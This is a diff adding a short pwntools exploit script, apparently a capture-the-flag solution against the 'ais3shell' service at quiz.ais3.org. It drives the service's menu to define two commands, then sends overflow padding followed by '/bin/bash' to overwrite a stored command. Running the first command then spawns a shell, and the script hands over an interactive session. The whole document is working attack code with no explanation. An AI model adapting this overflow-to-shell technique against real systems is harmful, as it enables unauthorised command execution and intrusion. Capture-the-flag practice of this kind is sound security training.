@@ -1,0 +1,30 @@
+from pwn import *
+
+r = process('ais3shell')
+r = remote('quiz.ais3.org', 10103 )
+
+r.recvuntil('$')
+r.sendline('define')
+r.recvuntil(':')
+r.sendline('3000')
+r.recvuntil(':')
+r.sendline('a' * 8)
+r.recvuntil(':')
+r.sendline('515')
+r.recvuntil(':')
+r.sendline('echo')
+
+r.recvuntil('$')
+r.sendline('define')
+r.recvuntil(':')
+r.sendline('100')
+r.recvuntil(':')
+r.sendline('c' * 8)
+r.recvuntil(':')
+r.sendline('500')
+r.recvuntil(':')
+r.sendline('d' * 16 * 17 + '/bin/bash')
+
+r.recvuntil('$')
+r.sendline('run aaaaaaaa')
+r.interactive()
